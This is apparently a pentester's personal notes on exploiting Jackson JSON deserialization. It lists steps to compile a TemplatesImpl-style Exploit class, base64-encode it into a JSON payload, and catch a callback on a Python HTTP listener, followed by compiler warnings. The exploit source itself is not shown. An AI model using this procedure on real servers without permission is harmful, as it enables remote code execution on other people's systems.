# Some of my thoughts.

# Context Switching
```
One of the challenges in this field can be context switching between various formsof test and applications, etc...
Windows to Linux to Mac to HyperVisors to Web Apps, Java to Ruby, etc...  I don't have a great way to handle that lol.
However, I don't want to have to relearn this, if I just need to demonstrate impact.  

So these are my notes for exploiting Jackson JSON deserialization.

Note, this was new to me.  So pardon the simplicity...

If you see things I missed or need to correct. Please let me know.



```

# How to compille

1. Setup a linux VM, or Kali, I used AWS 
2. Install java or openjdk.
3.  sudo yum install java-1.8.0-openjdk
4.  sudo yum install java-1.8.0-openjdk-devel
5.  Copy the Exploit.java into a file. Note in Java the name of the file shoudl be the same as the class
6.  You will want to chage the server to call back on line 9
7.  compile javac Exploit.java You may get some warning, I think its ok. lol. not sure. Seee below, I had 6.
8.  Confirm you have a file called Exploit.class
9.  Base64 encode Exploit.class `cat Exploit.class | base64 -w 0 > bytes.b64` -w 0 means just one line, line breaks can break payloads
10. Embed the base64 into our JSON that threw the `Unable to deserialize` error.
11. Before you exploit, start a simple python http listener to "catch" the proof of exploitation.
12. `python -m http.server 8443` starts a http server on port 8443 for example, whatever you used in step 6.
13. Send the Payload to the target
14. We _should_ get a call back, but if not seek evidence of exploitation on the server logs.



Some compilation warnings.
```


javac Exploit.java 
Exploit.java:4: warning: AbstractTranslet is internal proprietary API and may be removed in a future release
public class Exploit extends com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet {
                                                                            ^
Exploit.java:19: warning: DOM is internal proprietary API and may be removed in a future release
  public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM document, com.sun.org.apache.xml.internal.dtm.DTMAxisIterator iterator, com.sun.org.apache.xml.internal.serializer.SerializationHandler handler) {
                                                               ^
Exploit.java:19: warning: DTMAxisIterator is internal proprietary API and may be removed in a future release
  public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM document, com.sun.org.apache.xml.internal.dtm.DTMAxisIterator iterator, com.sun.org.apache.xml.internal.serializer.SerializationHandler handler) {
                                                                                                                 ^
Exploit.java:19: warning: SerializationHandler is internal proprietary API and may be removed in a future release
  public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM document, com.sun.org.apache.xml.internal.dtm.DTMAxisIterator iterator, com.sun.org.apache.xml.internal.serializer.SerializationHandler handler) {
                                                                                                                                                                                      ^
Exploit.java:23: warning: DOM is internal proprietary API and may be removed in a future release
  public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handler)  {
                                                               ^
Exploit.java:23: warning: SerializationHandler is internal proprietary API and may be removed in a future release
  public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handler)  {
                                                                                                                        ^
6 warnings
```

I need to explore this more, in terms of necesary pre-requisites, etc...

